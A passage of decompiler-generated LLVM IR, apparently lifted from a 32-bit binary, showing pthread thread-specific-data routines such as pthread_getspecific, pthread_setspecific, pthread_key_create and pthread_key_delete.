  %v7_805afa4 = icmp ult i32 %v0_805afa4, %v1_805afa4
  %v1_805afb1 = icmp eq i1 %v7_805afa4, false
  br i1 %v1_805afb1, label %dec_label_pc_805afe2, label %dec_label_pc_805afb3

dec_label_pc_805afb3:                             ; preds = %entry
  %v1_805afb3 = load i32, i32* @global_var_8079c50.566, align 16
  %v7_805afb3 = icmp ult i32 %v0_805afa4, %v1_805afb3
  br i1 %v7_805afb3, label %dec_label_pc_805afc8, label %dec_label_pc_805afbb

dec_label_pc_805afbb:                             ; preds = %dec_label_pc_805afb3
  %v1_805afbb = load i32, i32* @global_var_8079c54.567, align 4
  %v7_805afbb = icmp ult i32 %v0_805afa4, %v1_805afbb
  br i1 %v7_805afbb, label %dec_label_pc_805afe2, label %dec_label_pc_805afc8

dec_label_pc_805afc8:                             ; preds = %dec_label_pc_805afbb, %dec_label_pc_805afb3
  %v0_805afc8 = load i32, i32* @global_var_807f358.569, align 8
  %v1_805afc8 = icmp eq i32 %v0_805afc8, 0
  br i1 %v1_805afc8, label %dec_label_pc_805afd6, label %dec_label_pc_805afd1

dec_label_pc_805afd1:                             ; preds = %dec_label_pc_805afc8
  %v0_805afd1 = call i32 @__pthread_find_self()
  br label %dec_label_pc_805afd6

dec_label_pc_805afd6:                             ; preds = %dec_label_pc_805afc8, %dec_label_pc_805afd1
  %v2_805afdc = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805afe2

dec_label_pc_805afe2:                             ; preds = %dec_label_pc_805afbb, %entry, %dec_label_pc_805afd6
  %v0_805afe2 = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_805afbb ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_805afdc, %dec_label_pc_805afd6 ]
  ret i32 %v0_805afe2

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8074f40 to i32), { 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_8075120.568 to i32), { 0, 1, 11, 2, 3, 4, 5, 12, 13, 6, 7, 8, 9, 10 }
  uselistorder i32 ()* @__pthread_find_self, { 6, 0, 3, 5, 8, 4, 7, 1, 10, 9, 2 }
  uselistorder label %dec_label_pc_805afe2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805afd6, { 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805afe6 = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v2_805aff4 = mul i32 %arg1, 4
  %v3_805aff4 = add i32 %v2_805aff4, 364
  %v4_805aff4 = add i32 %v3_805aff4, %v1_805afe6
  ret i32 %v4_805aff4
}

define i32 @__pthread_internal_tsd_get(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805afff = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v2_805b008 = mul i32 %arg1, 4
  %v3_805b008 = add i32 %v2_805b008, 364
  %v4_805b008 = add i32 %v3_805b008, %v1_805afff
  %v5_805b008 = inttoptr i32 %v4_805b008 to i32*
  %v6_805b008 = load i32, i32* %v5_805b008, align 4
  ret i32 %v6_805b008
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805b016 = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v3_805b023 = mul i32 %arg1, 4
  %v4_805b023 = add i32 %v3_805b023, 364
  %v5_805b023 = add i32 %v4_805b023, %v1_805b016
  %v6_805b023 = inttoptr i32 %v5_805b023 to i32*
  store i32 %arg2, i32* %v6_805b023, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 2, 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805b030 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v6_805b03e = icmp ugt i32 %arg1, 1023
  br i1 %v6_805b03e, label %dec_label_pc_805b067, label %dec_label_pc_805b040

dec_label_pc_805b040:                             ; preds = %entry
  %v1_805b040 = call i32 @thread_self.19(i32 %v0_805b030)
  %v0_805b045 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805b047 = udiv i32 %v0_805b045, 32
  %v2_805b04a = mul nuw nsw i32 %v2_805b047, 4
  %v3_805b04a = add i32 %v1_805b040, 236
  %v4_805b04a = add i32 %v3_805b04a, %v2_805b04a
  %v5_805b04a = inttoptr i32 %v4_805b04a to i32*
  %v6_805b04a = load i32, i32* %v5_805b04a, align 4
  %v1_805b051 = icmp eq i32 %v6_805b04a, 0
  br i1 %v1_805b051, label %dec_label_pc_805b067, label %dec_label_pc_805b055

dec_label_pc_805b055:                             ; preds = %dec_label_pc_805b040
  %v1_805b055 = mul i32 %v0_805b045, 8
  %v2_805b055 = add i32 %v1_805b055, ptrtoint (i32* @global_var_8079ca0.629 to i32)
  %v3_805b055 = inttoptr i32 %v2_805b055 to i32*
  %v4_805b055 = load i32, i32* %v3_805b055, align 8
  %v5_805b055 = icmp eq i32 %v4_805b055, 0
  br i1 %v5_805b055, label %dec_label_pc_805b067, label %dec_label_pc_805b05f

dec_label_pc_805b05f:                             ; preds = %dec_label_pc_805b055
  %v1_805b05f = urem i32 %v0_805b045, 32
  store i32 %v1_805b05f, i32* %ebx.global-to-local, align 4
  %v2_805b062 = mul nuw nsw i32 %v1_805b05f, 4
  %v3_805b062 = add i32 %v2_805b062, %v6_805b04a
  %v4_805b062 = inttoptr i32 %v3_805b062 to i32*
  %v5_805b062 = load i32, i32* %v4_805b062, align 4
  br label %dec_label_pc_805b069

dec_label_pc_805b067:                             ; preds = %dec_label_pc_805b055, %dec_label_pc_805b040, %entry
  br label %dec_label_pc_805b069

dec_label_pc_805b069:                             ; preds = %dec_label_pc_805b05f, %dec_label_pc_805b067
  %storemerge = phi i32 [ %v5_805b062, %dec_label_pc_805b05f ], [ 0, %dec_label_pc_805b067 ]
  store i32 %v0_805b030, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805b05f, { 1, 0 }
  uselistorder i32 %v0_805b045, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805b069, { 1, 0 }
}

define i32 @__pthread_destroy_specifics() local_unnamed_addr {
dec_label_pc_805b0e6:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805b06d = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_805b070 = load i32, i32* @edi, align 4
  %v0_805b071 = load i32, i32* @esi, align 4
  %v0_805b072 = load i32, i32* @ebx, align 4
  store i32 %v0_805b072, i32* %stack_var_-16, align 4
  %v1_805b076 = call i32 @thread_self.19(i32 %v0_805b072)
  store i32 %v1_805b076, i32* @esi, align 4
  %v0_805b0e6.pre = load i32, i32* @ebp, align 4
  %v1_805b0e6 = add i32 %v0_805b0e6.pre, -3
  %v6_805b0e6 = sub i32 2, %v0_805b0e6.pre
  %v7_805b0e6 = and i32 %v6_805b0e6, %v0_805b0e6.pre
  %v8_805b0e6 = icmp slt i32 %v7_805b0e6, 0
  %v9_805b0e6 = icmp eq i32 %v1_805b0e6, 0
  %v10_805b0e6 = icmp slt i32 %v1_805b0e6, 0
  %v3_805b0e9 = icmp eq i1 %v10_805b0e6, %v8_805b0e6
  %v4_805b0e9 = icmp eq i1 %v9_805b0e6, false
  %v5_805b0e9 = and i1 %v4_805b0e9, %v3_805b0e9
  br i1 %v5_805b0e9, label %dec_label_pc_805b0f7, label %dec_label_pc_805b0eb

dec_label_pc_805b087:                             ; preds = %dec_label_pc_805b0d8.dec_label_pc_805b087_crit_edge, %dec_label_pc_805b0eb
  %v0_805b089 = phi i32 [ %v1_805b076, %dec_label_pc_805b0eb ], [ %v0_805b089.pre, %dec_label_pc_805b0d8.dec_label_pc_805b087_crit_edge ]
  %v0_805b0d8.pre27 = phi i32 [ 0, %dec_label_pc_805b0eb ], [ %v1_805b0d8, %dec_label_pc_805b0d8.dec_label_pc_805b087_crit_edge ]
  store i32 0, i32* @edi, align 4
  %v2_805b089 = mul i32 %v0_805b0d8.pre27, 4
  %v3_805b089 = add i32 %v2_805b089, 236
  %v4_805b089 = add i32 %v3_805b089, %v0_805b089
  %v5_805b089 = inttoptr i32 %v4_805b089 to i32*
  %v6_805b089 = load i32, i32* %v5_805b089, align 4
  %v7_805b089 = icmp eq i32 %v6_805b089, 0
  %v1_805b091 = icmp eq i1 %v7_805b089, false
  br i1 %v1_805b091, label %dec_label_pc_805b0d3.preheader, label %dec_label_pc_805b0d8

dec_label_pc_805b0d3.preheader:                   ; preds = %dec_label_pc_805b087
  br label %dec_label_pc_805b095

dec_label_pc_805b095:                             ; preds = %dec_label_pc_805b0d2.dec_label_pc_805b095_crit_edge, %dec_label_pc_805b0d3.preheader
  %v1_805b0aa = phi i32 [ %v0_805b089, %dec_label_pc_805b0d3.preheader ], [ %v1_805b0aa.pre, %dec_label_pc_805b0d2.dec_label_pc_805b095_crit_edge ]
  %v0_805b0d8.pre29 = phi i32 [ %v0_805b0d8.pre27, %dec_label_pc_805b0d3.preheader ], [ %v0_805b0d8.pre, %dec_label_pc_805b0d2.dec_label_pc_805b095_crit_edge ]
  %v0_805b0a328 = phi i32 [ 0, %dec_label_pc_805b0d3.preheader ], [ %v1_805b0d2, %dec_label_pc_805b0d2.dec_label_pc_805b095_crit_edge ]
  %v2_805b097 = mul i32 %v0_805b0d8.pre29, 32
  %v2_805b09a = add i32 %v2_805b097, %v0_805b0a328
  %v1_805b09c = mul i32 %v2_805b09a, 8
  %v2_805b09c = add i32 %v1_805b09c, ptrtoint (i32* @global_var_8079ca4.630 to i32)
  %v3_805b09c = inttoptr i32 %v2_805b09c to i32*
  %v4_805b09c = load i32, i32* %v3_805b09c, align 4
  %v1_805b0b1 = icmp eq i32 %v4_805b09c, 0
  br i1 %v1_805b0b1, label %dec_label_pc_805b0d2, label %dec_label_pc_805b0b7

dec_label_pc_805b0b7:                             ; preds = %dec_label_pc_805b095
  %v3_805b0aa = mul i32 %v0_805b0d8.pre29, 4
  %v4_805b0aa = add i32 %v3_805b0aa, 236
  %v5_805b0aa = add i32 %v4_805b0aa, %v1_805b0aa
  %v6_805b0aa = inttoptr i32 %v5_805b0aa to i32*
  %v7_805b0aa = load i32, i32* %v6_805b0aa, align 4
  %v1_805b0a3 = mul i32 %v0_805b0a328, 4
  %v8_805b0aa = add i32 %v7_805b0aa, %v1_805b0a3
  %v1_805b0b3 = inttoptr i32 %v8_805b0aa to i32*
  store i32 0, i32* %v1_805b0b3, align 4
  call void @__pseudo_call(i32 %v4_805b09c)
  %v0_805b0d2.pre = load i32, i32* @edi, align 4
  %v0_805b0d8.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b0d2

dec_label_pc_805b0d2:                             ; preds = %dec_label_pc_805b095, %dec_label_pc_805b0b7
  %v0_805b0d8.pre = phi i32 [ %v0_805b0d8.pre29, %dec_label_pc_805b095 ], [ %v0_805b0d8.pre.pre, %dec_label_pc_805b0b7 ]
  %v0_805b0d2 = phi i32 [ %v0_805b0a328, %dec_label_pc_805b095 ], [ %v0_805b0d2.pre, %dec_label_pc_805b0b7 ]
  %v1_805b0d2 = add i32 %v0_805b0d2, 1
  store i32 %v1_805b0d2, i32* @edi, align 4
  %v7_805b0d6 = icmp sgt i32 %v1_805b0d2, 31
  br i1 %v7_805b0d6, label %dec_label_pc_805b0d8, label %dec_label_pc_805b0d2.dec_label_pc_805b095_crit_edge

dec_label_pc_805b0d2.dec_label_pc_805b095_crit_edge: ; preds = %dec_label_pc_805b0d2
  %v1_805b0aa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b095

dec_label_pc_805b0d8:                             ; preds = %dec_label_pc_805b0d2, %dec_label_pc_805b087
  %v0_805b0d8 = phi i32 [ %v0_805b0d8.pre27, %dec_label_pc_805b087 ], [ %v0_805b0d8.pre, %dec_label_pc_805b0d2 ]
  %v1_805b0d8 = add i32 %v0_805b0d8, 1
  store i32 %v1_805b0d8, i32* %ebx.global-to-local, align 4
  %v7_805b0dc = icmp sgt i32 %v1_805b0d8, 31
  br i1 %v7_805b0dc, label %dec_label_pc_805b0de, label %dec_label_pc_805b0d8.dec_label_pc_805b087_crit_edge

dec_label_pc_805b0d8.dec_label_pc_805b087_crit_edge: ; preds = %dec_label_pc_805b0d8
  %v0_805b089.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b087

dec_label_pc_805b0de:                             ; preds = %dec_label_pc_805b0d8
  %v0_805b0de = load i32, i32* @ebp, align 4
  %v1_805b0de = add i32 %v0_805b0de, 1
  store i32 %v1_805b0de, i32* @ebp, align 4
  %v0_805b0f7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b0f7

dec_label_pc_805b0eb:                             ; preds = %dec_label_pc_805b0e6
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b087

dec_label_pc_805b0f7:                             ; preds = %dec_label_pc_805b0de, %dec_label_pc_805b0e6
  %v0_805b0f7 = phi i32 [ %v1_805b076, %dec_label_pc_805b0e6 ], [ %v0_805b0f7.pre, %dec_label_pc_805b0de ]
  %stack_var_-20.0.lcssa = phi i32 [ 1, %dec_label_pc_805b0e6 ], [ 0, %dec_label_pc_805b0de ]
  %v1_805b0f7 = add i32 %v0_805b0f7, 28
  %v2_805b0f7 = inttoptr i32 %v1_805b0f7 to i32*
  %v3_805b0f7 = load i32, i32* %v2_805b0f7, align 4
  store i32 %v3_805b0f7, i32* @eax, align 4
  store i32 %v0_805b0f7, i32* @edx, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805b0fe = call i32 @__pthread_lock(i32 %stack_var_-20.0.lcssa)
  %v0_805b128.pr = load i32, i32* @ebx, align 4
  %v7_805b12b25 = icmp sgt i32 %v0_805b128.pr, 31
  br i1 %v7_805b12b25, label %dec_label_pc_805b12d, label %dec_label_pc_805b105

dec_label_pc_805b105:                             ; preds = %dec_label_pc_805b0f7, %dec_label_pc_805b127
  %v1_805b10526 = phi i32 [ %v1_805b127, %dec_label_pc_805b127 ], [ %v0_805b128.pr, %dec_label_pc_805b0f7 ]
  %v0_805b105 = load i32, i32* @esi, align 4
  %v2_805b105 = mul i32 %v1_805b10526, 4
  %v3_805b105 = add i32 %v2_805b105, 236
  %v4_805b105 = add i32 %v3_805b105, %v0_805b105
  %v5_805b105 = inttoptr i32 %v4_805b105 to i32*
  %v6_805b105 = load i32, i32* %v5_805b105, align 4
  %v1_805b10c = icmp eq i32 %v6_805b105, 0
  br i1 %v1_805b10c, label %dec_label_pc_805b127, label %dec_label_pc_805b110

dec_label_pc_805b110:                             ; preds = %dec_label_pc_805b105
  %v1_805b114 = call i32 @free(i32 %v6_805b105)
  %v0_805b11c = load i32, i32* @esi, align 4
  %v1_805b11c = load i32, i32* @ebx, align 4
  %v2_805b11c = mul i32 %v1_805b11c, 4
  %v3_805b11c = add i32 %v0_805b11c, 236
  %v4_805b11c = add i32 %v3_805b11c, %v2_805b11c
  %v5_805b11c = inttoptr i32 %v4_805b11c to i32*
  store i32 0, i32* %v5_805b11c, align 4
  %v0_805b127.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805b127

dec_label_pc_805b127:                             ; preds = %dec_label_pc_805b105, %dec_label_pc_805b110
  %v0_805b127 = phi i32 [ %v1_805b10526, %dec_label_pc_805b105 ], [ %v0_805b127.pre, %dec_label_pc_805b110 ]
  %v1_805b127 = add i32 %v0_805b127, 1
  store i32 %v1_805b127, i32* @ebx, align 4
  %v7_805b12b = icmp sgt i32 %v1_805b127, 31
  br i1 %v7_805b12b, label %dec_label_pc_805b12d, label %dec_label_pc_805b105

dec_label_pc_805b12d:                             ; preds = %dec_label_pc_805b127, %dec_label_pc_805b0f7
  %v0_805b130 = load i32, i32* @esi, align 4
  %v1_805b130 = add i32 %v0_805b130, 28
  %v2_805b130 = inttoptr i32 %v1_805b130 to i32*
  %v3_805b130 = load i32, i32* %v2_805b130, align 4
  %v1_805b133 = inttoptr i32 %v3_805b130 to i32*
  %v2_805b133 = call i32 @__pthread_unlock(i32* %v1_805b133)
  %v2_805b13b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805b13b, i32* @ebx, align 4
  store i32 %v0_805b071, i32* @esi, align 4
  store i32 %v0_805b070, i32* @edi, align 4
  store i32 %v0_805b06d, i32* @ebp, align 4
  ret i32 %v2_805b133

; uselistorder directives
  uselistorder i32 %v1_805b127, { 1, 2, 0 }
  uselistorder i32 %v1_805b10526, { 1, 0 }
  uselistorder i32 %v0_805b0f7, { 1, 0 }
  uselistorder i32 %v1_805b0d8, { 1, 0, 2 }
  uselistorder i32 %v1_805b0d2, { 0, 2, 1 }
  uselistorder i32 %v0_805b0a328, { 1, 0, 2 }
  uselistorder i32 %v0_805b0d8.pre29, { 1, 2, 0 }
  uselistorder i32 %v0_805b0d8.pre27, { 2, 0, 1 }
  uselistorder i32 %v1_805b0e6, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__pthread_unlock, { 42, 50, 7, 8, 9, 10, 43, 44, 46, 47, 48, 49, 3, 45, 11, 38, 12, 13, 4, 37, 39, 14, 15, 16, 17, 18, 19, 20, 21, 36, 40, 41, 22, 23, 24, 25, 26, 27, 28, 30, 31, 5, 32, 29, 33, 0, 1, 2, 35, 34, 6 }
  uselistorder i32 (i32)* @__pthread_lock, { 6, 1, 0, 29, 28, 27, 5, 3, 2, 33, 4, 26, 9, 25, 24, 32, 10, 8, 23, 22, 21, 11, 7, 20, 19, 18, 16, 31, 15, 17, 14, 35, 34, 12, 13, 30 }
  uselistorder label %dec_label_pc_805b127, { 1, 0 }
  uselistorder label %dec_label_pc_805b105, { 1, 0 }
  uselistorder label %dec_label_pc_805b0d2, { 1, 0 }
  uselistorder label %dec_label_pc_805b087, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805b142 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_805b14d = icmp ugt i32 %arg1, 1023
  br i1 %v6_805b14d, label %dec_label_pc_805b1a4, label %dec_label_pc_805b14f

dec_label_pc_805b14f:                             ; preds = %entry
  %v1_805b14f = mul i32 %arg1, 8
  %v2_805b14f = add i32 %v1_805b14f, ptrtoint (i32* @global_var_8079ca0.629 to i32)
  %v3_805b14f = inttoptr i32 %v2_805b14f to i32*
  %v4_805b14f = load i32, i32* %v3_805b14f, align 8
  %v5_805b14f = icmp eq i32 %v4_805b14f, 0
  br i1 %v5_805b14f, label %dec_label_pc_805b1a4, label %dec_label_pc_805b159

dec_label_pc_805b159:                             ; preds = %dec_label_pc_805b14f
  %v1_805b159 = call i32 @thread_self.19(i32 %v0_805b142)
  %v0_805b15e = load i32, i32* @ebx, align 4
  %v2_805b160 = udiv i32 %v0_805b15e, 32
  store i32 %v2_805b160, i32* @esi, align 4
  %v2_805b163 = mul nuw nsw i32 %v2_805b160, 4
  %v3_805b163 = add i32 %v1_805b159, 236
  %v4_805b163 = add i32 %v3_805b163, %v2_805b163
  %v5_805b163 = inttoptr i32 %v4_805b163 to i32*
  %v6_805b163 = load i32, i32* %v5_805b163, align 4
  %v7_805b163 = icmp eq i32 %v6_805b163, 0
  store i32 %v1_805b159, i32* @edi, align 4
  %v1_805b16d = icmp eq i1 %v7_805b163, false
  br i1 %v1_805b16d, label %dec_label_pc_805b18f, label %dec_label_pc_805b16f

dec_label_pc_805b16f:                             ; preds = %dec_label_pc_805b159
  %v5_805b175 = call i32 @calloc(i64 32, i32 4, i32 %v1_805b159, i32 %v1_805b159)
  %v1_805b184 = icmp eq i32 %v5_805b175, 0
  br i1 %v1_805b184, label %dec_label_pc_805b1a9, label %dec_label_pc_805b188

dec_label_pc_805b188:                             ; preds = %dec_label_pc_805b16f
  %v1_805b188 = load i32, i32* @edi, align 4
  %v2_805b188 = load i32, i32* @esi, align 4
  %v3_805b188 = mul i32 %v2_805b188, 4
  %v4_805b188 = add i32 %v1_805b188, 236
  %v5_805b188 = add i32 %v4_805b188, %v3_805b188
  %v6_805b188 = inttoptr i32 %v5_805b188 to i32*
  store i32 %v5_805b175, i32* %v6_805b188, align 4
  %v0_805b193.pre = load i32, i32* @ebx, align 4
  %v0_805b196.pre = load i32, i32* @edi, align 4
  %v1_805b196.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b18f

dec_label_pc_805b18f:                             ; preds = %dec_label_pc_805b159, %dec_label_pc_805b188
  %v1_805b196 = phi i32 [ %v2_805b160, %dec_label_pc_805b159 ], [ %v1_805b196.pre, %dec_label_pc_805b188 ]
  %v0_805b196 = phi i32 [ %v1_805b159, %dec_label_pc_805b159 ], [ %v0_805b196.pre, %dec_label_pc_805b188 ]
  %v0_805b193 = phi i32 [ %v0_805b15e, %dec_label_pc_805b159 ], [ %v0_805b193.pre, %dec_label_pc_805b188 ]
  %v1_805b193 = urem i32 %v0_805b193, 32
  %v2_805b196 = mul i32 %v1_805b196, 4
  %v3_805b196 = add i32 %v0_805b196, 236
  %v4_805b196 = add i32 %v3_805b196, %v2_805b196
  %v5_805b196 = inttoptr i32 %v4_805b196 to i32*
  %v6_805b196 = load i32, i32* %v5_805b196, align 4
  %v3_805b19d = mul nuw nsw i32 %v1_805b193, 4
  %v4_805b19d = add i32 %v6_805b196, %v3_805b19d
  %v5_805b19d = inttoptr i32 %v4_805b19d to i32*
  store i32 %arg2, i32* %v5_805b19d, align 4
  br label %dec_label_pc_805b1a9

dec_label_pc_805b1a4:                             ; preds = %dec_label_pc_805b14f, %entry
  br label %dec_label_pc_805b1a9

dec_label_pc_805b1a9:                             ; preds = %dec_label_pc_805b16f, %dec_label_pc_805b18f, %dec_label_pc_805b1a4
  %v0_805b1ac = phi i32 [ 12, %dec_label_pc_805b16f ], [ 0, %dec_label_pc_805b18f ], [ 22, %dec_label_pc_805b1a4 ]
  ret i32 %v0_805b1ac

; uselistorder directives
  uselistorder i32 %v5_805b175, { 1, 0 }
  uselistorder i32 %v2_805b160, { 2, 1, 0 }
  uselistorder i32 %v0_805b15e, { 1, 0 }
  uselistorder i32 %v1_805b159, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_805b1a9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805b18f, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_807bca0.631 to i32), i32* %stack_var_-28, align 4
  %v1_805b1bb = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807bca0.631 to i32))
  %v0_805b1c3 = load i32, i32* @ebx, align 4
  %v6_805b1c9 = icmp ugt i32 %v0_805b1c3, 1023
  br i1 %v6_805b1c9, label %dec_label_pc_805b1d5, label %dec_label_pc_805b1cb

dec_label_pc_805b1cb:                             ; preds = %entry
  %v1_805b1cb = mul i32 %v0_805b1c3, 8
  %v2_805b1cb = add i32 %v1_805b1cb, ptrtoint (i32* @global_var_8079ca0.629 to i32)
  %v3_805b1cb = inttoptr i32 %v2_805b1cb to i32*
  %v4_805b1cb = load i32, i32* %v3_805b1cb, align 8
  %v5_805b1cb = icmp eq i32 %v4_805b1cb, 0
  %v1_805b1d3 = icmp eq i1 %v5_805b1cb, false
  br i1 %v1_805b1d3, label %dec_label_pc_805b1e9, label %dec_label_pc_805b1d5

dec_label_pc_805b1d5:                             ; preds = %dec_label_pc_805b1cb, %entry
  store i32 ptrtoint (i32* @global_var_807bca0.631 to i32), i32* %stack_var_-28, align 4
  %v1_805b1dd = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807bca0.631 to i32))
  br label %dec_label_pc_805b244

dec_label_pc_805b1e9:                             ; preds = %dec_label_pc_805b1cb
  %v0_805b1e9 = load i32, i32* @global_var_8075304.574, align 4
  %v10_805b1e9 = icmp eq i32 %v0_805b1e9, -1
  store i32 0, i32* %v3_805b1cb, align 8
  %v0_805b1fb = load i32, i32* @ebx, align 4
  %v1_805b1fb = mul i32 %v0_805b1fb, 8
  %v2_805b1fb = add i32 %v1_805b1fb, ptrtoint (i32* @global_var_8079ca4.630 to i32)
  %v3_805b1fb = inttoptr i32 %v2_805b1fb to i32*
  store i32 0, i32* %v3_805b1fb, align 4
  br i1 %v10_805b1e9, label %dec_label_pc_805b235, label %dec_label_pc_805b208

dec_label_pc_805b208:                             ; preds = %dec_label_pc_805b1e9
  %v0_805b208 = load i32, i32* %stack_var_-28, align 4
  %v1_805b208 = call i32 @thread_self.19(i32 %v0_805b208)
  %v0_805b20d = load i32, i32* @ebx, align 4
  %v1_805b20f = urem i32 %v0_805b20d, 32
  store i32 %v1_805b20f, i32* @ebx, align 4
  %v2_805b212 = udiv i32 %v0_805b20d, 32
  store i32 %v2_805b212, i32* @esi, align 4
  store i32 %v1_805b208, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b217

dec_label_pc_805b217:                             ; preds = %dec_label_pc_805b22f, %dec_label_pc_805b208
  %v0_805b21d = phi i32 [ %v2_805b22f, %dec_label_pc_805b22f ], [ %v1_805b208, %dec_label_pc_805b208 ]
  %v1_805b217 = add i32 %v0_805b21d, 44
  %v2_805b217 = inttoptr i32 %v1_805b217 to i8*
  %v3_805b217 = load i8, i8* %v2_805b217, align 1
  %v4_805b217 = icmp eq i8 %v3_805b217, 0
  %v1_805b21b = icmp eq i1 %v4_805b217, false
  br i1 %v1_805b21b, label %dec_label_pc_805b22f, label %dec_label_pc_805b21d

dec_label_pc_805b21d:                             ; preds = %dec_label_pc_805b217
  %v1_805b21d = load i32, i32* @esi, align 4
  %v2_805b21d = mul i32 %v1_805b21d, 4
  %v3_805b21d = add i32 %v0_805b21d, 236
  %v4_805b21d = add i32 %v3_805b21d, %v2_805b21d
  %v5_805b21d = inttoptr i32 %v4_805b21d to i32*
  %v6_805b21d = load i32, i32* %v5_805b21d, align 4
  %v1_805b224 = icmp eq i32 %v6_805b21d, 0
  br i1 %v1_805b224, label %dec_label_pc_805b22f, label %dec_label_pc_805b228

dec_label_pc_805b228:                             ; preds = %dec_label_pc_805b21d
  %v1_805b228 = load i32, i32* @ebx, align 4
  %v2_805b228 = mul i32 %v1_805b228, 4
  %v3_805b228 = add i32 %v2_805b228, %v6_805b21d
  %v4_805b228 = inttoptr i32 %v3_805b228 to i32*
  store i32 0, i32* %v4_805b228, align 4
  %v0_805b22f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b22f

dec_label_pc_805b22f:                             ; preds = %dec_label_pc_805b21d, %dec_label_pc_805b217, %dec_label_pc_805b228
  %v0_805b22f = phi i32 [ %v0_805b21d, %dec_label_pc_805b21d ], [ %v0_805b21d, %dec_label_pc_805b217 ], [ %v0_805b22f.pre, %dec_label_pc_805b228 ]
  %v1_805b22f = inttoptr i32 %v0_805b22f to i32*
  %v2_805b22f = load i32, i32* %v1_805b22f, align 4
  store i32 %v2_805b22f, i32* %edx.global-to-local, align 4
  %v12_805b231 = icmp eq i32 %v2_805b22f, %v1_805b208
  %v1_805b233 = icmp eq i1 %v12_805b231, false
  br i1 %v1_805b233, label %dec_label_pc_805b217, label %dec_label_pc_805b235

dec_label_pc_805b235:                             ; preds = %dec_label_pc_805b22f, %dec_label_pc_805b1e9
  store i32 ptrtoint (i32* @global_var_807bca0.631 to i32), i32* %stack_var_-28, align 4
  %v1_805b23d = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807bca0.631 to i32))
  br label %dec_label_pc_805b244

dec_label_pc_805b244:                             ; preds = %dec_label_pc_805b1d5, %dec_label_pc_805b235
  %storemerge = phi i32 [ 22, %dec_label_pc_805b1d5 ], [ 0, %dec_label_pc_805b235 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_805b22f, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3 }
  uselistorder i32 236, { 1, 2, 3, 4, 6, 7, 8, 9, 5, 0 }
  uselistorder i32 (i32)* @thread_self.19, { 5, 4, 0, 3, 1, 2, 6 }
  uselistorder i32* @global_var_8075304.574, { 2, 3, 4, 0, 5, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_805b244, { 1, 0 }
  uselistorder label %dec_label_pc_805b22f, { 2, 0, 1 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_807bca0.631 to i32), i32* %stack_var_-28, align 4
  %v1_805b255 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807bca0.631 to i32))
  store i32 %v1_805b255, i32* %eax.global-to-local, align 4
  %v0_805b297.pr = load i32, i32* @ebx, align 4
  %v7_805b29d10 = icmp sgt i32 %v0_805b297.pr, 1023
  br i1 %v7_805b29d10, label %dec_label_pc_805b29f, label %dec_label_pc_805b25f

dec_label_pc_805b25f:                             ; preds = %entry, %dec_label_pc_805b296
  %v0_805b29611 = phi i32 [ %v1_805b296, %dec_label_pc_805b296 ], [ %v0_805b297.pr, %entry ]
